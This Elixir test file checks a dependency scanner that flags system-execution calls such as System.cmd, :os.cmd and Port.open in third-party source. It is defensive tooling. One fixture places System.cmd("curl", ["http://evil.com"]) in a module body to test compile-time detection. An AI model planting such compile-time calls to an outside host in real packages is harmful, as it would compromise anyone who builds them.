defmodule VetCore.Checks.SystemExecTest do
  use ExUnit.Case

  alias VetCore.Checks.SystemExec
  alias VetCore.Types.{Dependency, Finding}

  setup do
    tmp_dir = Path.join(System.tmp_dir!(), "vet_system_exec_test_#{:erlang.unique_integer([:positive])}")
    dep_dir = Path.join([tmp_dir, "deps", "test_dep", "lib"])
    File.mkdir_p!(dep_dir)

    on_exit(fn -> File.rm_rf!(tmp_dir) end)

    %{tmp_dir: tmp_dir, dep_dir: dep_dir}
  end

  defp run_check(tmp_dir, source) do
    dep_dir = Path.join([tmp_dir, "deps", "test_dep", "lib"])
    File.write!(Path.join(dep_dir, "module.ex"), source)

    dep = %Dependency{name: :test_dep, version: "1.0.0", source: :hex}
    SystemExec.run(dep, tmp_dir, [])
  end

  test "detects System.cmd/2,3 in function bodies", %{tmp_dir: tmp_dir} do
    source = """
    defmodule TestMod do
      def run do
        System.cmd("ls", ["-la"])
      end
    end
    """

    findings = run_check(tmp_dir, source)

    assert length(findings) >= 1
    finding = hd(findings)
    assert finding.check_id == :system_exec
    assert finding.category == :system_exec
    assert finding.severity == :critical
    assert finding.dep_name == :test_dep
    assert String.contains?(finding.description, "System.cmd")
  end

  test "detects System.shell/1,2", %{tmp_dir: tmp_dir} do
    source = """
    defmodule TestMod do
      def run do
        System.shell("echo hello")
      end
    end
    """

    findings = run_check(tmp_dir, source)

    assert length(findings) >= 1
    finding = hd(findings)
    assert String.contains?(finding.description, "System.shell")
  end

  test "detects System.find_executable/1", %{tmp_dir: tmp_dir} do
    source = """
    defmodule TestMod do
      def check do
        System.find_executable("curl")
      end
    end
    """

    findings = run_check(tmp_dir, source)

    assert length(findings) >= 1
    finding = hd(findings)
    assert String.contains?(finding.description, "System.find_executable")
  end

  test "detects :os.cmd/1", %{tmp_dir: tmp_dir} do
    source = """
    defmodule TestMod do
      def run do
        :os.cmd(~c"whoami")
      end
    end
    """

    findings = run_check(tmp_dir, source)

    assert length(findings) >= 1
    finding = hd(findings)
    assert String.contains?(finding.description, ":os.cmd")
  end

  test "detects Port.open/2", %{tmp_dir: tmp_dir} do
    source = """
    defmodule TestMod do
      def run do
        Port.open({:spawn, "cat"}, [:binary])
      end
    end
    """

    findings = run_check(tmp_dir, source)

    assert length(findings) >= 1
    finding = hd(findings)
    assert String.contains?(finding.description, "Port.open")
  end

  test "does NOT flag modules without system exec calls (baseline)", %{tmp_dir: tmp_dir} do
    source = """
    defmodule SafeMod do
      def hello, do: :world
      def add(a, b), do: a + b
    end
    """

    findings = run_check(tmp_dir, source)

    assert findings == []
  end

  test "compile-time code in module body is flagged as compile_time?", %{tmp_dir: tmp_dir} do
    source = """
    defmodule TestMod do
      System.cmd("curl", ["http://evil.com"])

      def hello, do: :ok
    end
    """

    findings = run_check(tmp_dir, source)

    ct_findings = Enum.filter(findings, & &1.compile_time?)
    assert length(ct_findings) >= 1
    assert hd(ct_findings).severity == :critical
  end

  test "runtime code inside def is not compile_time?", %{tmp_dir: tmp_dir} do
    source = """
    defmodule TestMod do
      def run do
        System.cmd("echo", ["hi"])
      end
    end
    """

    findings = run_check(tmp_dir, source)

    rt_findings = Enum.reject(findings, & &1.compile_time?)
    assert length(rt_findings) >= 1
  end

  test "returns proper Finding struct fields", %{tmp_dir: tmp_dir} do
    source = """
    defmodule TestMod do
      def run do
        System.cmd("ls", [])
      end
    end
    """

    findings = run_check(tmp_dir, source)

    finding = hd(findings)
    assert %Finding{} = finding
    assert is_atom(finding.dep_name)
    assert is_binary(finding.file_path)
    assert is_integer(finding.line)
    assert finding.line > 0
    assert finding.check_id == :system_exec
    assert finding.category == :system_exec
    assert finding.severity in [:info, :warning, :critical]
    assert is_binary(finding.description)
  end
end
